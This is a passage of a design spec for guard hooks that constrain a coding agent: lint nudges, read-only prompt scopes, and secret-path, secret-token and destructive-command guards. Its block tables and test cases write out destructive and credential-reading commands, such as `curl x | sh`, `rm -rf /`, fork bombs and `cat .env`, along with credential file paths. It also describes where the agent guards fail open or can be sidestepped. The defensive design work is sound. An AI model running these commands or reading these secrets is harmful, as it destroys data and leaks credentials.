#### error-handling-lint-feedback — Diff-scoped error-handling lint after each Python edit (warn only)

`default` · `post_tool_use` · `Edit|Write|NotebookEdit` on the rule's globs `**/*.py` (`src/coding_agent_playbook/resources/rules/languages/python/error-handling.md:7-8`) · warn → `context` · `linked_rule: python-error-handling` · label: n/a

**Behavior.** Bucket 2 of the shared pipeline. The rule's frontmatter declares `lint_codes.warn: [E722, BLE001, S110, S112, B904, TRY400, TRY401, S101]` (bare except; blind except; try-except-pass/continue; missing `raise ... from`; `logger.error` instead of `logger.exception`; redundant exception in log message; `assert` as a runtime check). `S101` is dropped under `tests/**`, where `assert` is the pytest idiom. Changed lines only; never `deny`: `BLE001` legitimately fires on top-level handlers, and most of these codes are outside a typical project's CI select. Where the project does select them (this repo's `[tool.ruff.lint] select`, pyproject.toml:117-126, includes `E` and `B`, so `E722`/`B904` are CI-failing here), they land in bucket 1 with ` (rule python-error-handling)`.

**Implementation.** Handler `ruff_lint_feedback` (same module as `ruff_post_edit`), one handler shared by the three rule-linked hooks and parameterized by `linked_rule`; `gc:shared.lint_buckets["error-handling-lint-feedback"]`. `# noqa: CODE` is honored by ruff itself. Codes the pinned ruff does not know are dropped at sync, never probed per edit.

**Budget & failure mode.** ~0 ms incremental (D1 is shared). `on_error: open`.

**Guards.** Changed lines; shared 8-line cap; per-session dedupe; warn-only.

**Portability.** Claude `PostToolUse`, OpenCode `tool.execute.after` (appended output). The rule text reaches every harness via CLAUDE.md / AGENTS.md / `.continue/rules/`.

**Off-workstation twin.** None required (advisory). The enforcement path is explicit: a project that wants these codes enforced adds them to `[tool.ruff.lint] select`; they then move to bucket 1 and CI's `ruff check .` enforces them.

**Tests.** An Edit adding `except: pass` on a new line → `E722`/`S110` context; the same code on an untouched legacy line → silent; the same diagnostic twice → once; a code absent from `FakeRuff`'s `rule --all` output → dropped at sync and absent from the D1 argv; `S101` in `tests/test_x.py` → silent; with `E` in the project select → bucket-1 line with the rule suffix.

#### typing-lint-feedback — Public-signature annotation and modern-typing nudges, conditioned like the typing rule (warn only)

`default` · `post_tool_use` · `Edit|Write|NotebookEdit` on `**/*.py` excluding `tests/**` and `*.pyi` · warn → `context` · `linked_rule: python-typing` (inherits `applies_if: {python_version: ">=3.11"}`, `src/coding_agent_playbook/resources/rules/languages/python/typing.md.j2:9-10`) · label: n/a

**Behavior.** `lint_codes` as in the shape example above: `ANN001`/`ANN201` (missing annotations), `ANN401` (`Any`; message appends "Any is a last resort: narrow it, or justify a `# type: ignore[code]`"), `B006` (mutable default), `PGH003` (blanket `type: ignore`, warn, never deny), `UP007`/`UP045` (`X | None`), and only when `python_version >= 3.12` the PEP 695 codes `UP040`/`UP046`/`UP047`. That condition reads the same `python_version` fact as the rule body's branch (typing.md.j2:21); the body compares strings lexicographically, which agrees with `evaluate_predicate` for every version that passes the rule's own `>=3.11` gate. Extra filters:
- `ANN001`/`ANN201` only on public defs: one `ast.parse` of the post-edit file maps lines to enclosing defs; `_`-prefixed and nested functions are dropped (house style: internal helpers may skip annotations).
- `UP007`/`UP045` are suppressed when they are in `gc:shared.ruff.safe_fix_select` (M1 already fixed them).
- All `ANN*` codes are skipped when the Stop coordinator's mypy tier is enabled (stop-ci-parity-gate config, E.2): mypy then covers annotations at Stop. With the default (mypy off at Stop), per-edit ANN feedback fills the gap.

**Implementation.** `ruff_lint_feedback` + `_public_def_lines(tree: ast.Module) -> set[int]` (NEW). `python_version` comes from `gc:shared.facts.python_version` rendered at sync, not from the possibly stale `detector_cache`, so enforcement cannot contradict the rendered guidance. mypy never runs per edit.

**Budget & failure mode.** ~0 ms for D1 plus one `ast.parse` (~5-20 ms). `on_error: open`.

**Guards.** Warn-only; public names only; changed lines; shared cap and dedupe.

**Portability.** As error-handling-lint-feedback.

**Off-workstation twin.** None required (advisory); annotation enforcement is the project's mypy in CI (this repo: `strict = true`, pyproject.toml:133-141).

**Tests.** `python_version = 3.11` repo: a generic-function edit reports no `UP046`; `3.12`: it does. New public `def f(x)` → `ANN001`/`ANN201`; new `_helper` → silent. Mypy Stop tier enabled → no `ANN*`. `PGH003` → context, not deny. `UP045` with `UP` in the project select → no line (fixed by M1).

#### pytest-conventions-feedback — pytest-style lint on test edits (ruff PT codes; AST heuristics opt-in)

`default` · `post_tool_use` · `Edit|Write|NotebookEdit` on `tests/**/*.py` (`src/coding_agent_playbook/resources/rules/frameworks/pytest.md.j2:7-8`) · warn → `context` · `linked_rule: pytest` (inherits `applies_if: {has_framework: ["pytest"]}`, pytest.md.j2:9-10) · label: n/a

**Behavior.** `lint_codes.warn: [PT006, PT007, PT009, PT011, PT018, PT027]` (parametrize shape; unittest-style asserts and raises; `pytest.raises` too broad; composite assertion). Opt-in AST heuristics (`config.ast_heuristics: false` by default): (a) a `unittest.TestCase` subclass in a test file created this session (no HEAD blob); (b) a `for` loop containing `assert` inside `test_*`, at most once per file per session; (c) `async def test_*` without `@pytest.mark.asyncio` when `pytest-asyncio` is in `gc:shared.facts.dev_dependencies` (the same fact as pytest.md.j2:54) and the rendered `asyncio_mode` is not `auto`. The mirrored-layout check is dropped (noisy for integration and CLI tests).

**Implementation.** `ruff_lint_feedback` + `_pytest_ast_heuristics(tree, *, created_this_session: bool) -> list[str]` (NEW). The heuristics never import or execute the test module (principle 8). `asyncio_mode` is rendered at sync from `[tool.pytest.ini_options]` into `gc:shared.facts.pytest_asyncio_mode`.

**Budget & failure mode.** ~0 ms for PT codes; ~10 ms for the opt-in AST pass. `on_error: open`.

**Guards.** Warn-only; changed lines; heuristics off by default; shared cap and dedupe.

**Portability.** As error-handling-lint-feedback.

**Off-workstation twin.** None required (advisory; generate-tests.md.j2:49 and the rule text carry the convention).

**Tests.** A test edit adding `self.assertEqual` → `PT009`; a loop with `assert` and heuristics off → silent, on → one line; a non-pytest repo → not rendered; a `src/` edit → no PT bucket.

#### prompt-write-scope-guard — Enforce each playbook prompt's write scope, native-first

`default` · `user_prompt_submit` (ledger) + `pre_tool_use` (enforce; also records scope from the `Skill` tool) · pre-tool: `Edit|Write|NotebookEdit` (`MultiEdit` tolerated), write-shaped `Bash`, and `Skill` · block → `deny` / `ask` · label: **boundary** for structured edit tools; **speed bump** for Bash

**Schema change.** `PromptFrontmatter` (types.py:128-154) gains `write_scope: dict[str, Any] = field(default_factory=dict)` with exactly one of `read_only: true` or `globs: [<glob>, ...]` (validated by `playbook validate`; None-coerced like the other fields; carried by the agent_harness sidecar, §A.7). It is a dict on purpose: `_without_empty` (types.py:45-47) drops `[]`, so an empty-list "read-only" would silently round-trip to "unrestricted", and a defaulted bool would add `read_only: false` to every prompt's `to_markdown` output. Amend SPEC §6.2, §6.6 and §10.6.1. Assignments:

| Prompt | `write_scope` | Evidence |
| --- | --- | --- |
| `explain` | `{read_only: true}` | explain.md:36 "Do not modify the code. This is a read-only task." |
| `review` | `{read_only: true}` | review.md.j2:52 "Do not modify the code; only review it." |
| `security-review`, `find-injected-vulnerability` | `{read_only: true}` | bodies do not say it today; their eval tasks gate `file_unchanged` (security-review-pickle-load/task.toml:19, find-injected-vuln-pytorch-deserial/task.toml:21-22) |
| `generate-tests` | `{globs: ["tests/**", "**/conftest.py"]}` | generate-tests.md.j2:39 "Do not silently \"fix\" the code to make the test pass." |

**Behavior — native first.** OpenCode: read-only prompts render `agent: plan` in the command frontmatter (`_render_prompt_opencode_command`, renderer.py:302-338; SPEC §10.6.1 already lists `agent`). Claude Code: read-only prompts render `disallowed-tools: Edit Write NotebookEdit` in the command frontmatter (verified: commands and skills accept it; the tools are removed while the command is active and the restriction clears at the next message, which matches the ledger semantics). This needs `_render_prompt_claude_command` (renderer.py:282-299), which emits no frontmatter today, to emit a line-1 `---` fence, so the sentinel moves to the first body line (the PR-H agent_harness precedent); the renderer change and the `_scan_for_stale` (claude_code_adapter.py:191) / guard anchor change are §C.4.3 and P3's `has_sentinel`. Glob scopes have no native form.

**Behavior — fallback hook (Claude only).**
- `user_prompt_submit`: detects `/<slash>` in raw form or inside the harness's command wrapper and records `{prompt_id, write_scope}` keyed by `session_id` in `<state>`; any other prompt clears it. Uncertain detection → no scope (fail open).
- `pre_tool_use` on the `Skill` tool: the model can also run a command or skill itself, which fires no `UserPromptSubmit`; the guard records the scope of the `tool_input` skill name the same way (cheap: the pre-tool dispatcher already runs). Claude's `UserPromptExpansion` event (typed slash commands) is not canonical and stays a documented gap; the native `disallowed-tools` frontmatter covers both paths. prompt-output-contract-on-stop reads the same record.
- `pre_tool_use`, read-only scope: `Edit`/`Write`/`NotebookEdit` → `deny` "`/<id>` is read-only: report findings; the user will ask for fixes in a follow-up." Write-shaped Bash (redirect into the repo, `sed -i`, `tee`, `cp`/`mv` into the repo, `git apply`, `patch`, `git commit`) → `ask`.
- Glob scope: a write outside the globs → `ask`, quoting generate-tests.md.j2:39.

**Implementation.** `handlers: {pre_tool_use: prompt_scope_guard}` (`hook_runtime/handlers/prompt_scope.py`, NEW). The `user_prompt_submit` active-prompt record is a dispatcher branch, not this hook's companion handler (`hook_runtime/active_prompt.py`, NEW, shared name — proposed): it is active whenever prompt-write-scope-guard **or** prompt-output-contract-on-stop is enabled, so disabling this guard never makes the output-contract stage inert (OQ-45); `gc:prompt-write-scope-guard.scopes = {<slash>: {read_only | globs}}` rendered at sync from `PromptFrontmatter`; write-shaped Bash detection uses §D.2.5's `shell.parse_shell` / `write_targets`. The guard short-circuits on one `stat` of the ledger file when no scope is active.

**Budget & failure mode.** < 1 ms incremental with no active scope; <= 100 ms with one. Detection uncertainty → open; internal error → `ask`.

**Guards.** Active only during a scoped prompt; cleared by the next user prompt; native constraints preferred, the hook is defense in depth.

**Portability.** Claude: native `disallowed-tools` + both hook events. OpenCode: native `agent: plan` only (`user_prompt_submit` is not rendered there, QC-2; no ledger). Others: the body sentence in AGENTS.md.

**Off-workstation twin.** None at run time (the scope is a session concept). Offline evidence is the eval corpus: the review/explain/security tasks already grade `file_unchanged`.

**Tests.** `/security-review src/app.py` then `Edit src/app.py` → deny; a model-invoked `Skill` `review` then `Edit` → deny; `sed -i s/x/y/ src/app.py` → ask; next prompt "fix it" then the same Edit → none; `/generate-tests` then `Write tests/test_x.py` → none, `Write src/x.py` → ask; unrecognized wrapper → no scope. Round-trip: `write_scope: {read_only: true}` survives `to_markdown`/`from_markdown`; prompts without it render byte-identically. Adapter goldens: OpenCode `agent: plan`; Claude `disallowed-tools` with the sentinel on the first body line.

#### toolchain-missing-hint — Reactive hint when the dev toolchain is missing

`default` · `post_tool_use` + `post_tool_use_failure` · `Bash` · inject_context → `context` · label: n/a

**Behavior.** In Claude Code a non-zero Bash exit arrives as `PostToolUseFailure` with `error` starting "Exit code N" (verified), so the failure event is the primary path; successful results are scanned too. One regex over the last 8 KiB of the output: `No module named '?(mypy|pytest|ruff|commitizen)'?` or `(ruff|mypy|pytest|cz): command not found`. commit-message-convention (§F.4) emits the same once-per-session hint when the `cz` pin is missing. Once per session per tool it injects: "Dev tooling is not installed in this environment. The project installs it with `<install_hint>`. Ask the user before installing (it may contact the package index)." It never runs the install and is silent otherwise.

**Implementation.** Handler `toolchain_hint` (`hook_runtime/handlers/toolchain.py`, NEW). `gc:toolchain-missing-hint.install_hint` is derived at sync from `package_manager` (detector.py:169-191) and the pyproject extras/groups: uv + `[project.optional-dependencies].dev` → `uv sync --extra dev`; uv + `[dependency-groups].dev` → `uv sync --group dev`; poetry → `poetry install --with dev`; pip / pip-tools → `pip install -e ".[dev]"`. For commitizen the hint is the same command when `commitizen` is in the dev extras/group, else `ask the user to install commitizen (pipx install commitizen)`. It replaces the session-start toolchain probe (E.1 session-start-playbook-briefing), which would have needed a venv probe (and a plain `uv run` that may sync) at every start.

**Budget & failure mode.** < 1 ms incremental. `on_error: open`.

**Guards.** Once per session per tool; advice to the user, not a command to the agent.

**Portability.** Claude: both events. OpenCode: `tool.execute.after` (does not fire when a tool throws, OpenCode #50133; inferred: a non-zero bash exit returns normally and is seen). Others: the AGENTS.md setup paragraph.

**Off-workstation twin.** n/a.

**Tests.** `PostToolUseFailure` Bash payload with `No module named mypy` → one hint naming `uv sync --extra dev`; second time → silent; a successful command → silent; poetry fixture → `poetry install --with dev`.

#### notebook-output-hygiene — Warn when agent-edited notebooks keep outputs, base64 payloads or oversized cells

`opt-in` · `post_tool_use` + Stop coordinator tier · `Edit|Write|NotebookEdit` on `*.ipynb`; `applies_if: {has_notebooks: true}` (a known boolean fact, detector.py:357-359) · warn → `context` · label: n/a

**Behavior.** `stat()` first: above `gc:shared.notebook_max_bytes` (default 5 MiB, shared with sensitive-data-read-guard) → warn without parsing. Otherwise `json.load` and, for the cells the agent touched (NotebookEdit `cell_id`; Write/Edit → cells whose source differs from the HEAD notebook; all cells when untracked), warn if they keep outputs, an `image/*` or base64 payload, or more than `config.max_cell_output_kb` (64) of output: "outputs may embed data rows; strip outputs before committing." Once per notebook per session. The Stop tier repeats the check over diff `.ipynb` files as one warn line in the combined message.

**Implementation.** Handler `notebook_hygiene` (`hook_runtime/handlers/notebooks.py`, NEW), stdlib `json` only; keys `gc:notebook-output-hygiene.{max_cell_output_kb}`, `gc:shared.notebook_max_bytes`.

**Budget & failure mode.** 5-50 ms per notebook edit. `on_error: open`.

**Guards.** Touched cells only; size cap before parsing; once per notebook per session.

**Portability.** Post-edit on Claude and OpenCode; the Stop tier is Claude-only.

**Off-workstation twin.** `playbook check-notebooks [PATHS]` **(NEW; shared name — proposed)**, stdlib, exposed as an opt-in `playbook-notebooks` entry (`types: [jupyter]`) in `.pre-commit-hooks.yaml` (with the `test_precommit_hooks_yaml.py` update). It exists because SPEC §13.2 deliberately excludes nbstripout/nbqa from the air-gapped starter (SPEC.md:1712).

**Tests.** Edited notebook with a 2 MB base64 PNG output → warn; stripped notebook → silent; oversized file → warn with a `json.load` spy proving no parse; a repo without notebooks → not rendered.

### E.4 Secrets and risky actions

Nine guards on reads, writes and shell commands. They share one pre-tool dispatcher process (L3) and the plumbing below.

#### Shared: Bash parsing, path policy and the secret library

- **Shell and git parsing are §D's** (`hook_runtime/shell.py`: `parse_shell(text, kind, cwd, cfg) -> ShellCommand` with `Segment`s and `write_targets`; `hook_runtime/gitargv.py`: `parse_git(segment) -> GitInvocation`, §D.2.5). This section only adds `gitargv.commit_message_sources(inv) -> list[str] | Uninspectable` (`-m` values joined as git does, heredoc bodies, `-F <file>` inside the worktree; `-F <(...)` and editor-composed messages are `Uninspectable`). Tokens, never substrings, so `echo git commit --author` is not a git command. Wrapper prefixes come from `guard_config.shell.wrapper_prefixes` (`[hooks] wrapper_prefixes`, §B.1): empty in the engine; a consumer that runs a command-rewriting launcher (say `proxy`) declares it, `["proxy"]` — a user's own rewriting hook runs **in parallel** and rewrites the *executed* input while the guard sees the original, and agents also type `proxy …` literally (a rewriter can change what executes after the guard's verdict, §C.2.9). **Degradation follows §D.2.5:** a set `ShellCommand.parse_error` sends every guard to its conservative raw-regex branch (there is no exception type). Shared by destructive-command-guard, git-commit-push-policy-guard, exfil-channel-guard, block-precommit-bypass (E.2) and §F's commit-message-convention.
- **`hook_runtime/_hosts.py` (NEW).** `extract_hosts(segment) -> list[str]` (URL args, scp-style `user@host:path`, git remotes via local `git remote get-url`, index flags, `git+https` requirements) as strings only, never DNS or connect probes (a lookup is itself egress; principle 10); `is_loopback(host)` via `ipaddress` plus `localhost` (no implicit RFC1918 trust); suffix matching. Shared by exfil-channel-guard and network-egress-guard.
- **`security/patterns.py` (NEW).** `SECRET_PATH_GLOBS`, `SECRET_PATH_EXEMPT`, `SECRET_CONTENT_RULES` (id, compiled regex, label), `EXAMPLE_SECRET_ALLOWLIST`, `WEAKENING_PRAGMAS`, and `screen_regex(pattern: str) -> str | None` (rejects nested unbounded quantifiers and over-long patterns; used by `playbook validate` for every overlay- or repo-supplied regex in this section).
- **`security/paths.py` (NEW).** `PathPolicy(deny: tuple[str, ...], allow: tuple[str, ...], mode: Literal["deny", "ask"])` with `classify(key: str, *, nlink: int) -> Literal["deny", "ask"] | None`, operating on the `NormalizedPath.key` that §D.2.4's `normalize_path` already produced (realpath, case-folding on darwin/win32, the `nlink` hard-link fact) — the caller normalizes, so `security` never imports `hook_runtime`. Also `is_secret_path(path, *, home)` (P7). Shared by secrets-path-guard, sensitive-data-read-guard and the detector.
- **`security/secrets.py` (NEW).** `scan_text(text: str, path: str) -> list[SecretFinding]` (stdlib `re` + `math`); the name avoids colliding with the evaluator `Finding`. One function, three consumers: secret-content-guard, stop-diff-sweep, `playbook scan-secrets`.
- **Prefilter.** The Bash dispatcher computes the argv0 set of all segments once; each guard declares the argv0s it inspects, and no guard code runs when none match.
- **Native twins.** The claude_code adapter renders, from the same tables, `permissions.deny` entries (`Read(...)`, `Edit(...)`, literal `Bash(... *)` prefixes) and, for the overlay guards, `sandbox.filesystem.denyRead` / `sandbox.network.allowedDomains`, all through §C.2.4's generic managed-array operation (one lock entry per string; E-Q2 resolved). Only the `permissions.deny` rows hold without a sandbox and survive a missing interpreter (Claude also copies `Read` deny rules into `denyRead` when sandboxed). The `sandbox.*` arrays bind only **sandboxed Bash**, and only when the sandbox runs: `sandbox.enabled` defaults to false, an unavailable sandbox runs unsandboxed unless `failIfUnavailable` is set, `allowedDomains` only pre-allows (unlisted hosts prompt), and `network.strictAllowlist` is user/managed-scope only. The project file never sets those scalars, so the `sandbox.*` twins are **speed bumps** unless a regulated overlay delivers `sandbox.enabled: true`, `failIfUnavailable: true` and `strictAllowlist: true` through managed (or user) settings — the deployment §B.4 calls the sole boundary.

#### secrets-path-guard — Deny agent reads and writes of credential paths (SPEC §17.3 extended to the agent)

`default` · `pre_tool_use` · path fields of `Read|Grep|Glob|Edit|Write|NotebookEdit` (`MultiEdit` tolerated); `mcp__.*` args named `path`, `file_path`, `uri`, `filename`, `paths[]`; `Bash` argv tokens and redirect targets per segment · block → `deny` (`ask` for a new `.env` write and for hard links) · label: **boundary** for structured tools (plus the native deny layer); **speed bump** for Bash

**Behavior.** Path-only: it never opens a file to classify it (SPEC §17.3, SPEC.md:1916). `SECRET_PATH_GLOBS`: SPEC §17.3's `.env*`, `*.pem`, `*.key`, and `*credentials*` restricted to non-code extensions (`credentials.py` passes); `*.p12`, `*.pfx`, `*.jks`, `*.keystore`, `id_rsa*` / `id_ed25519*` (not `.pub`); `.netrc`, `.pypirc`, `.npmrc`, `pip.conf`, `uv.toml`, `.git-credentials`, `.vault-token`, `krb5cc_*`; `*.tfstate`, `*.tfvars`, `*.kdbx`; `~/.aws/**`, `~/.ssh/**`, `~/.kube/config`, `~/.config/gcloud/**`, `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.m2/settings.xml`, `~/.claude/.credentials.json`. Exempt: `.env.example|.sample|.template|.dist` and `config.allow_paths` (test fixtures). Bash: any argv token or redirect target that resolves to a secret path, whatever argv0 is; `git show REV:<secret>`, `git log -p -- <secret>`, `source|. <secret>`. A `Read` target with `st_nlink > 1` whose `(st_dev, st_ino)` is in the session's secret-inode index → `ask`. Deny reason (2 lines): "Blocked: <rel> holds credentials. Use .env.example for variable NAMES; ask the user to supply values; read them from the environment at runtime." Writing a NEW `.env` → `ask`. Bare `env` / `printenv` → once-per-session `context` warning, not `ask`. A repo-wide `Grep` is not denied (ripgrep honors `.gitignore`; in-tree secret files are covered by the native `Read(...)` denies), an explicit secret path or secret glob is.

**Implementation.** Handler `secret_path_guard` (`hook_runtime/handlers/secret_paths.py`, NEW) over `PathPolicy`. `SECRET_PATH_GLOBS` is the single source for this guard, stop-diff-sweep, exfil-channel-guard's body-file check, sensitive-data-read-guard and the detector: wiring `detector.py` to skip these paths implements SPEC §17.3's "Detector explicitly skips these paths", which is not implemented today (only `_IGNORE_DIRS`, detector.py:20-22). Keys: `gc:shared.secret_path_globs`, `gc:shared.secret_path_exempt`, `gc:secrets-path-guard.allow_paths`. The secret-inode index is built by the session_start dispatcher (bounded walk skipping `_IGNORE_DIRS`, 50 ms cap) into `<state>`, lazily on first need otherwise. Native layer at sync: `permissions.deny` `Read(<glob>)` / `Edit(<glob>)` with exemptions as `!`-negations in the same list (gitignore semantics; a carve-out only applies within one settings source, verified), plus `sandbox.filesystem.denyRead` for the `~/` entries (a speed bump unless the sandbox is enforced, see Shared above). Overlays may only append globs (L2).

**Budget & failure mode.** <= 100 ms p95 per file-tool or Bash call in the shared dispatcher (matching < 1 ms; interpreter start dominates). `on_error: ask`. A missing interpreter or a timeout fails open in Claude Code, which is why the native layer is mandatory and the briefing heartbeat (E.1) reports degradation.

**Guards.** Stateless apart from the inode index; 2-line reason; env warning deduped.

**Portability.** Claude `PreToolUse` (including the `mcp__.*` path-arg heuristic) + native denies. OpenCode `tool.execute.before` for `read/edit/write/glob/grep/bash`; MCP tools are not forwarded by the shim (§C.3.3), so the MCP heuristic is **degraded** on OpenCode (validate warns; `playbook check` shows `degraded`). Harnesses without hooks: native rules where an adapter exists, plus the AGENTS.md paragraph.

**Off-workstation twin.** None can exist for reads: the leak is the read itself (the content reaches the model endpoint and the transcript). The commit side is covered by stop-diff-sweep and `playbook-secrets`.

**Tests.** `tests/hooks/test_secrets_path_guard.py`, parametrized: `Read .env` → deny; `Read .ENV` with platform darwin → deny; `Read .env.example` → none; `Read src/auth/credentials.py` → none; `Read config/credentials.json` → deny; symlink `notes.txt -> .env` → deny; hard link `notes2.txt` → ask; `cat .env`, `git show HEAD:.env`, `proxy cat ~/.aws/credentials` (with `wrapper_prefixes=["proxy"]`), `bash -c 'source .env'` → deny; `mcp__filesystem__read_file {path: ".env"}` → deny; `printenv` → context. Plus `tests/unit/test_detector.py`: a filesystem spy proves no secret-glob file is ever opened by `detect()`.

#### secret-content-guard — Write-time secret-token scanner plus push-range scan (the air-gapped gitleaks replacement)

`default` · `pre_tool_use` · text about to be persisted by `Write|Edit|NotebookEdit` (`content`, `new_string`, `edits[].new_string`, `new_source`, OpenCode `apply_patch` added lines); `Bash` `git push` · block → `deny` / `ask` · label: **boundary** for structured writes (the hook sees the exact bytes); **speed bump** for the push scan

**Behavior.** High-precision token formats only: PEM `PRIVATE KEY` headers; AWS `(AKIA|ASIA)` + 16; GitHub `gh[pousr]_` / `github_pat_`; Slack `xox[abprs]-`; Google `AIza` + 35; Stripe `sk_live_`; Anthropic `sk-ant-`; OpenAI `sk-proj-`; Azure `AccountKey=`; JWT; URLs with inline `user:password@`. Documented example keys (e.g. `AKIAIOSFODNN7EXAMPLE`) are pre-allowlisted. Lockfiles and binaries are skipped; for `.ipynb` content the JSON is parsed and only sources and text outputs are scanned (no base64 images). Scanned bytes are capped at `config.max_scan_bytes` (1 MiB); on overflow it scans the head and tail 256 KiB each and returns `ask`. A hit returns `deny` naming the rule id, `<rel>:<line>` and the match length, with **no characters of the value** in model-facing text: "Use an env var or the secret manager and reference it by name." On `git push` it scans the added lines of `git log -p @{u}..HEAD`, falling back to `git log -p HEAD --not --remotes` when there is no upstream, so a new branch's first push is still scanned. The `# playbook: allow-secret <rule-id>` pragma is honored only when present at HEAD; one added this session returns `ask` and is listed by gate-weakening-guard (E.2). The generic entropy rule is off (`config.entropy: false`; overlays may enable it). There is no commit-time branch: the `playbook-secrets` pre-commit hook owns commit time, and block-precommit-bypass (E.2) makes it unskippable for the agent.

**Implementation.** Handler `secret_content_guard` (`hook_runtime/handlers/secret_content.py`, NEW) over `security/secrets.py:scan_text`. Overlay `config.extra_patterns` are compiled and `screen_regex`-checked at `playbook validate`. `gitleaks` is used only if already on PATH at sync, pinned in `machine.json` with a stat signature like ruff, and only with an engine-rendered config at `.coding-agent-playbook/hooks/gitleaks.toml` beside `guard_config.json` (a repo `.gitleaks.toml` is agent-writable); it is never downloaded. This resolves a SPEC contradiction: §17.3 promises `gitleaks` and `detect-private-key` in the pre-commit baseline (SPEC.md:1917) and §16.4 lists gitleaks in CI (SPEC.md:1902), but §13.2 excludes both because they need a remote clone (SPEC.md:1712), so today nothing scans. Amend §13.2, §16.4 and §17.3 to `playbook-secrets`.

**Budget & failure mode.** Scan < 5 ms; <= 100 ms p95 per write including process start; push scan 10-500 ms, scaling with unpushed commits. `on_error: ask`; a timeout fails open in Claude Code, hence the byte cap; stop-diff-sweep and the pre-commit hook are the backstops for Bash-written secrets.

**Guards.** Format-specific rules only by default; masked output everywhere; pragma-at-HEAD prevents self-authorization.

**Portability.** Pre-write on Claude and OpenCode. Harnesses without pre-write payloads rely on stop-diff-sweep (Claude) and the twin.

**Off-workstation twin.** `playbook scan-secrets [--staged | --range A..B | --worktree | PATHS]` **(NEW CLI subcommand)** and a pre-commit entry `playbook scan-secrets --staged`: `coding-agent-playbook-secrets` (`repo: local`, `language: system`) in `resources/precommit/config.yaml.j2` and `playbook-secrets` in `.pre-commit-hooks.yaml` (with the `test_precommit_hooks_yaml.py` id-set update); CI runs `--range <base>..HEAD` inside `playbook ci`.

**Tests.** `tests/security/test_secrets.py` + `tests/hooks/test_secret_content_guard.py`: a Write with a real-shaped AWS key → deny and the reason contains none of the key's characters; `AKIAIOSFODNN7EXAMPLE` → none; a low-entropy password assignment → none; an Edit adding a new allow-secret pragma → ask, pragma at HEAD → none; push scan in a tmp repo with no upstream finds a key in the only commit; a 5 MB Write → head+tail scan and ask; an overlay pattern `(a+)+$` is rejected by `playbook validate`.

#### destructive-command-guard — Destructive and irreversible shell commands (catastrophic deny, lossy ask)

`default` · `pre_tool_use` · `Bash` (and `PowerShell` where exposed), every unwrapped segment; prefilter exits when no argv0 is in the table · block → `deny` / `ask` · label: **speed bump** (against accidents; the real barriers are server-side branch protection, DB grants and an OS sandbox)

**Behavior.** A predicate table `{argv0: [Predicate(match, decision, reason)]}`.
- `deny` (catastrophic shapes only): `rm -r|-R|--recursive` whose realpath'd target is `/`, `~`, `$HOME`, `..`, `*`, `.git`, the repo root, or outside `git rev-parse --show-toplevel`; `git push --force|-f|+refspec|--mirror|--delete` **and** `--force-with-lease` to a protected branch (`gc:shared.protected_branches`, default `main`, `master`, `release/*`, resolved through the refspec or upstream); `git update-ref -d` and `git filter-branch` / `filter-repo` on protected refs; `curl|wget` piped into `sh|bash|zsh|python|perl`; `mkfs*`; `dd of=/dev/*`; fork bombs; `chmod -R 777`; `find ... -delete` and `rsync --delete` targeting outside the repo.
- `ask`: lossy in-repo operations (`git reset --hard`, `git checkout -- .`, `git restore .`, `git clean -f[dx]`) only when `git status --porcelain` shows work that would be lost (a clean tree passes); `rm` with an unexpanded or possibly empty `$VAR` path; a non-force push to the default branch; a force push without lease to a non-protected branch; `git branch -D`; `git worktree remove --force`; bare `git stash` / `pop` / `drop` / `clear` while linked worktrees exist (the stash stack is shared across worktrees; the reason gives the `git stash push -u -m <tag>`, capture-SHA, `git stash apply <sha>` recipe).
- Always allowed: `rm -rf` of build/cache dirs (`config.safe_rm_dirs`: `dist`, `build`, `__pycache__`, `.pytest_cache`, `.mypy_cache`, `.ruff_cache`, `htmlcov`, `node_modules`).
- Non-POSIX shells: `ask` on any recursive delete or force. Reasons are at most 2 lines and name the safe alternative ("Push a feature branch; the user merges.").
- Overlays add rows (SQL `DROP`/`TRUNCATE`, `kubectl delete`, `terraform destroy`, prod hosts) via `config.extra_rows: [{argv0, pattern, decision, reason}]`; union-only, they cannot remove or relax engine rows.

**Implementation.** Handler `destructive_command_guard` (`hook_runtime/handlers/destructive.py`, NEW) in the shared Bash dispatcher with block-precommit-bypass (E.2), git-commit-push-policy-guard, dependency-allowlist-guard and exfil-channel-guard. Engine rows are Python predicates; overlay rows are data. Local git subprocesses run only for git segments. Literal-prefix rows also render native `permissions.deny` `Bash(<prefix> *)` entries; predicate rows (realpath targets, dirty-tree checks) have no native form. When an equivalent user-level guard is present (e.g. a careful-style PreToolUse Bash hook in `~/.claude/settings.json`, which `playbook-hook doctor` detects read-only), the user disables this hook via `[hooks] disable` to avoid double prompts.

**Budget & failure mode.** <= 100 ms p95 per Bash call, plus 5-20 ms for 1-3 local git subprocesses on git segments only. An unparseable segment falls back to a conservative raw regex; an internal exception → `ask`.

**Guards.** The deny tier is limited to catastrophic shapes so users do not disable the pack; asks fire only when work would actually be lost; every decision goes to guard-decision-log.

**Portability.** Shell pre-tool is the most portable event: Claude `PreToolUse` Bash, OpenCode `tool.execute.before` (`bash`; its `workdir` arg is the cwd for realpath).

**Off-workstation twin.** Server-side branch protection / rulesets (out of repo); the golden red-team table runs in engine CI.

**Tests.** `tests/hooks/test_destructive_command_guard.py`, golden table through `playbook-hook simulate pre_tool_use` in a tmp git repo: `rm -rf /` → deny; `rm -rf build/` → none; `rm -rf $DIR` with `DIR` unset → ask; `git push -f origin main`, `git -C . push origin main --force`, `proxy git push --force origin main` → deny; `git push --force-with-lease origin main` → deny, to `feat/x` → none; `bash -c 'rm -rf ~'` → deny; `curl x | sh` → deny; `git reset --hard` dirty → ask, clean → none; `git stash` with a linked worktree → ask.

#### git-commit-push-policy-guard — The agent must not change identity, authorship or signing; org rows empty by default

`default` · `pre_tool_use` · `Bash`: `git commit|merge|rebase|commit-tree|tag|push`, `gh pr create`, `git add -f`, `git config`, `git -c ...`, and `GIT_AUTHOR_*` / `GIT_COMMITTER_*` / `GIT_CONFIG_*` env prefixes, through compound chains · block → `deny` / `ask` · label: **speed bump** (the authoritative control is a server-side push rule or ruleset)

**Behavior — default rows (on).**
- `deny` `--author=`; agent-added `-S` / `--gpg-sign` / `--no-gpg-sign` (the user's own `commit.gpgsign` config still applies); `git -c user.name|user.email|commit.gpgsign=...`, `GIT_AUTHOR_*` / `GIT_COMMITTER_*` prefixes and `GIT_CONFIG_COUNT/KEY_n/VALUE_n` injection of those keys; any WRITE to `git config user.name|user.email` (set, `--unset`, `--add`, `--replace-all`, any scope). Reads and `--get` pass.
